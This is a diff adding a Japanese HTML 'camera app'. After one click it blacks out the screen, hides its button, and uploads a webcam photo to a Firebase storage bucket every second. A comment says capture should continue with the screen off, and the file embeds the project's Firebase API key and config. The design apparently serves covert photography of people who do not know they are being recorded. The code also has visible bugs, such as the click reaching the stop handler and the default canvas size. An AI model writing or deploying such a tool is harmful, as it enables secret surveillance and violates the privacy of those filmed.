@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>カメラアプリ</title>
+    <style>
+        body {
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        #captureButton {
+            background-color: red;
+            border: none;
+            border-radius: 50%;
+            width: 100px;
+            height: 100px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <button id="captureButton"></button>
+
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-storage.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-auth.js"></script>
+    <script>
+        // Firebaseの設定を初期化
+        const firebaseConfig = {
+              apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
+              authDomain: "nou-no-circle.firebaseapp.com",
+              projectId: "nou-no-circle",
+              storageBucket: "nou-no-circle.appspot.com",
+              messagingSenderId: "756338805186",
+              appId: "1:756338805186:web:cb740e035ac611b5baae5b",
+              measurementId: "G-TWBV38P13D"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+
+        const storage = firebase.storage();
+        const auth = firebase.auth();
+
+        // 匿名認証
+        auth.signInAnonymously().catch((error) => {
+            console.error('Authentication failed:', error);
+        });
+
+        const captureButton = document.getElementById('captureButton');
+        let isCapturing = false;
+        let captureInterval;
+
+        captureButton.addEventListener('click', async () => {
+            if (isCapturing) return;
+
+            isCapturing = true;
+            captureButton.style.display = 'none';
+
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            captureInterval = setInterval(async () => {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(async (blob) => {
+                    const fileName = `photos/${Date.now()}.jpg`;
+                    const storageRef = storage.ref().child(fileName);
+                    await storageRef.put(blob);
+                    console.log(`Uploaded ${fileName}`);
+                }, 'image/jpeg');
+            }, 1000);
+        });
+
+        // 黒い画面をタップすると撮影を停止
+        document.body.addEventListener('click', () => {
+            if (!isCapturing) return;
+
+            isCapturing = false;
+            captureButton.style.display = 'block';
+
+            clearInterval(captureInterval);
+            console.log('Capturing stopped.');
+        });
+
+        // 画面オフ状態でも撮影が続くようにする
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'hidden' && isCapturing) {
+                console.log('Page hidden, capturing continues.');
+            }
+        });
+    </script>
+</body>
+</html>
